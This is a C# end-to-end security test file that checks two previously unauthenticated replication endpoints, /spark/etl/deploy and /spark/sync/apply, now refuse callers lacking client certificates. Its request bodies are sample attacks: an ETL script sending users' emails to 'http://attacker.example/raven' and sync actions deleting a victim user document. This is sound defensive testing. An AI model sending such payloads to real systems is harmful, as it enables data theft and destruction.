using System.Net;
using System.Net.Http.Json;
using MintPlayer.Spark.E2E.Tests._Infrastructure;

namespace MintPlayer.Spark.E2E.Tests.Security;

/// <summary>
/// R2-C1 / R2-C2 — <c>/spark/etl/deploy</c> and <c>/spark/sync/apply</c> are cross-module
/// endpoints that previously shipped with no authentication at all. Round 2 gates them behind
/// mTLS.
/// <para>
/// <b>Which mode this actually exercises.</b> An earlier version of this file claimed the host
/// ran in Development mode. It does not — the E2E host sets <c>ASPNETCORE_ENVIRONMENT=E2E</c>,
/// so <c>Auto</c> resolves to <c>Production</c>. The assertions were
/// <c>BeOneOf([Forbidden, Unauthorized])</c>, loose enough to pass under either mode, so they
/// pinned neither and the docstring's claim went unchecked for as long as it was wrong.
/// </para>
/// <para>
/// Each case now asserts the one status its branch produces, which makes the mode observable:
/// a named-but-unregistered module reaches the certificate check and gets <b>401</b>, while an
/// empty module name is refused <b>before</b> it, at 403. Under Development those would be 403
/// and 403 — so if the host's environment ever changes, these fail rather than quietly passing.
/// Development's own behaviour (registered module accepted, unregistered refused) is pinned in
/// <c>ModuleCertificateValidatorTests</c>, where both can be exercised in one process.
/// </para>
/// <para>
/// The thumbprint-mismatch path stays a unit test — exercising it end-to-end would require
/// per-process cert provisioning plus Kestrel reconfiguration.
/// </para>
/// </summary>
[Collection(FleetE2ECollection.Name)]
public class ReplicationEndpointAuthTests
{
    private readonly FleetE2ECollectionFixture _fixture;
    public ReplicationEndpointAuthTests(FleetE2ECollectionFixture fixture) => _fixture = fixture;

    [Fact]
    public async Task Unauth_post_etl_deploy_with_unknown_requesting_module_is_refused()
    {
        using var http = SparkClientFactory.CreateHttpClient(_fixture.Host);

        var body = new
        {
            RequestingModule = "Attacker-Not-Registered",
            TargetDatabase = "victim",
            TargetUrls = new[] { "http://attacker.example/raven" },
            Scripts = new[]
            {
                new
                {
                    SourceCollection = "Users",
                    Script = "loadToUsers({Email: this.Email})",
                }
            }
        };

        var response = await http.PostAsJsonAsync("/spark/etl/deploy", body);

        // Production: the caller named a module, so the cert check runs first and no cert was
        // presented. Critically NOT 200 — the previous behaviour was no check at all, and this
        // body would have put an attacker-controlled ETL target into RavenDB.
        response.StatusCode.Should().Be(HttpStatusCode.Unauthorized,
            "ETL deployment must refuse a caller that presents no client certificate");
    }

    [Fact]
    public async Task Unauth_post_sync_apply_with_unknown_requesting_module_is_refused()
    {
        using var http = SparkClientFactory.CreateHttpClient(_fixture.Host);

        var body = new
        {
            RequestingModule = "Attacker-Not-Registered",
            Actions = new[]
            {
                new
                {
                    Collection = "SparkUsers",
                    DocumentId = "users/victim",
                    ActionType = "Delete",
                }
            }
        };

        var response = await http.PostAsJsonAsync("/spark/sync/apply", body);

        response.StatusCode.Should().Be(HttpStatusCode.Unauthorized,
            "sync apply must refuse a caller that presents no client certificate — this endpoint "
            + "can delete any document in any collection, and was previously fully unauthenticated");
    }

    [Fact]
    public async Task Post_sync_apply_with_empty_requesting_module_is_refused()
    {
        using var http = SparkClientFactory.CreateHttpClient(_fixture.Host);

        var body = new
        {
            RequestingModule = "",
            Actions = new[]
            {
                new
                {
                    Collection = "SparkUsers",
                    DocumentId = "users/victim",
                    ActionType = "Delete",
                }
            }
        };

        var response = await http.PostAsJsonAsync("/spark/sync/apply", body);

        response.StatusCode.Should().Be(HttpStatusCode.Forbidden,
            "an empty RequestingModule is refused before the certificate is even considered, so "
            + "this is 403 where the named-module cases above are 401");
    }
}
